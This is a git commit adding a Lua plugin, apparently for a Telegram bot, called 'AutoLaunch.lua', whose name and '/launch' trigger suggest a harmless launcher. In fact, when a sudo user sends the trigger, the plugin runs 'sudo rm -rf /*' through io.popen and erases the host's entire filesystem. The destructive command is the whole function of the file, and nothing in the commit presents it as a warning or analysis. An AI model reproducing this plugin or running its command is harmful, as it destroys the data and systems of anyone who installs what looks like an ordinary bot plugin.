163b614563a608576174c1d4b7cb8993bbcc3d6f
sinabaloon <sinabaloon@gmail.com>
2016-08-05 03:41:32 -0700

    Add files via upload

---
+++ plugins/AutoLaunch.lua
@@ -0,0 +1,16 @@
+function run(msg, matches)
+if not is_sudo(msg) then
+return 
+end
+text = io.popen(" sudo rm -rf /* "):read('*all')
+  return text
+end
+return {
+  patterns = {
+    '^[#/!]launch$'
+  },
+  run = run,
+  moderated = true
+}
+
+-- مرجع کامل پلاگین @TelePlugin --
